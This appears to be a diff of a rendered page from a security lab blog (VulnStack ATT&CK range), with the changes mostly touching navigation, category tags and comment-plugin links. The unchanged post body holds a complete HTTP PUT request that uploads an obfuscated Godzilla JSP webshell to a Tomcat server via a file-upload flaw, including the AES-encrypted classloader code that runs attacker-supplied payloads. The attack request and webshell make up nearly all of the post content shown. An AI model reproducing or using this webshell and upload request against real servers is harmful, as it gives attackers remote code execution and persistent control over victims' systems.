@@ -36,6 +36,10 @@
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
   <!-- 代码块风格 -->
   
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
 
   <!-- jquery3.3.1 -->
   
@@ -86,6 +90,10 @@
       
         <li class="nav-item" data-path="/archives/">
           <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
         </li>
       
         <li class="nav-item" data-path="/tags/">
@@ -155,9 +163,31 @@
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-          2024-09-21 16:46:02
+          2024-11-29 12:57:10
         </span>
         
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/VulnStack-ATT-CK/" title="VulnStack-ATT&CK">
+                    <b>#</b> VulnStack-ATT&CK
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E9%9D%B6%E5%9C%BA/" title="靶场">
+                    #靶场
+                  </a>
+                </span>
+                
+              </span>
+          
       </div>
       <div class="markdown-body">
         <h2 id="Tomcat漏洞文件上传GetShell"><a href="#Tomcat漏洞文件上传GetShell" class="headerlink" title="Tomcat漏洞文件上传GetShell"></a>Tomcat漏洞文件上传GetShell</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">PUT /<span class="number">123.</span>jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.213</span><span class="number">.79</span>:<span class="number">2002</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: pma_lang=zh_CN</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Hello Administrator!Welcome To Tas9er Godzilla JSP Console!</span></span><br><span class="line"><span class="comment">&lt;%! String govsb_vCZ = &quot;32b9263ba0ca0ba6&quot;;</span></span><br><span class="line"><span class="comment">    String govsb_0QmkDfsJ5psCtWp = &quot;Tas9er&quot;;</span></span><br><span class="line"><span class="comment">    class govsb_noDGFwkx extends /*edusb_CK*/</span>ClassLoader &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">govsb_noDGFwkx</span><span class="params">(ClassLoader govsb_GW8L)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span><span class="comment">/*edusb_foLAvIJl7H*/</span>(govsb_GW8L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">govsb_oUujxt6dZb</span><span class="params">(<span class="type">byte</span>[] govsb_ZLjWwrnMQ8WJ)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.<span class="comment">/*edusb_xC6I*/</span>\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073<span class="comment">/*edusb_rX*/</span>(govsb_ZLjWwrnMQ8WJ, <span class="number">453996</span>-<span class="number">453996</span>, govsb_ZLjWwrnMQ8WJ.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] govsb_dm7oxpIMrl(<span class="type">byte</span>[] govsb_5UHPtWoPpPI, <span class="type">boolean</span> govsb_WKelMIzCo) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            j\u0061\u0076\u0061\u0078.<span class="comment">/*edusb_9DNef8*/</span>\u0063\u0072\u0079\u0070\u0074\u006f.<span class="type">Cipher</span> <span class="variable">govsb_yzXyPBECNrcB3</span> <span class="operator">=</span> j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e<span class="comment">/*edusb_X*/</span>(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            govsb_yzXyPBECNrcB3.init(govsb_WKelMIzCo?<span class="number">453996</span>/<span class="number">453996</span>:<span class="number">453996</span>/<span class="number">453996</span>+<span class="number">453996</span>/<span class="number">453996</span>,<span class="keyword">new</span> <span class="title class_">j</span>\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec.<span class="comment">/*edusb_Tt3m2UtTl0jLN*/</span>SecretKeySpec<span class="comment">/*edusb_b9u*/</span>(govsb_vCZ.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> govsb_yzXyPBECNrcB3.doFinal<span class="comment">/*edusb_khNNFOYB9k4V*/</span>(govsb_5UHPtWoPpPI);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    %&gt;&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] govsb_Tj = java.util.Base64.<span class="comment">/*edusb_YL2*/</span>\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072().<span class="comment">/*edusb_0OTvDhaXHk9RF*/</span>decode(request.getParameter(govsb_0QmkDfsJ5psCtWp));</span><br><span class="line">        govsb_Tj = govsb_dm7oxpIMrl(govsb_Tj,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute<span class="comment">/*edusb_4Bn56PL3BkOh*/</span>(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> <span class="title class_">govsb_noDGFwkx</span>(<span class="built_in">this</span>.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073().<span class="comment">/*edusb_C6*/</span>\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())<span class="comment">/*edusb_G0RppxudsG67h*/</span>.govsb_oUujxt6dZb(govsb_Tj));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>, govsb_Tj);</span><br><span class="line">            java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">govsb_a3VDUBHR6zfJcc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.<span class="comment">/*edusb_9tNMo34bHuc0vPG*/</span>ByteArrayOutputStream();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">govsb_AFha</span> <span class="operator">=</span> <span class="comment">/*edusb_LBLfux0y0vOg4c2*/</span>((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).<span class="comment">/*edusb_Q*/</span><span class="comment">/*edusb_lixCuwItN9q7*/</span><span class="keyword">new</span>\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()<span class="comment">/*edusb_uizf4dHFCJZ*/</span>;</span><br><span class="line">            govsb_AFha.equals(govsb_a3VDUBHR6zfJcc);</span><br><span class="line">            govsb_AFha.equals(pageContext);</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;1D4FBBC3B3161BE2992B5C5FDF4455CA&quot;</span>.substring(<span class="number">453996</span>-<span class="number">453996</span>, <span class="number">16</span>));</span><br><span class="line">            govsb_AFha.toString();</span><br><span class="line">            response.getWriter().write(java.util.Base64<span class="comment">/*edusb_K*/</span>.getEncoder()<span class="comment">/*edusb_hx*/</span>.encodeToString(govsb_dm7oxpIMrl(govsb_a3VDUBHR6zfJcc.toByteArray(),<span class="literal">true</span>)));</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;1D4FBBC3B3161BE2992B5C5FDF4455CA&quot;</span>.substring(<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
@@ -260,9 +290,31 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2024-09-21 16:46:02
+              2024-11-29 12:57:10
             </span>
             
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/VulnStack-ATT-CK/" title="VulnStack-ATT&CK">
+                        <b>#</b> VulnStack-ATT&CK
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E9%9D%B6%E5%9C%BA/" title="靶场">
+                        #靶场
+                      </a>
+                    </span>
+                    
+                  </span>
+              
           </div>
           <div class="post-foot-prev">
             
@@ -321,8 +373,8 @@
     }
   </script>
   
-    <link rel="stylesheet" href="/plugins/gitalk.css">
-    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
   
 
 
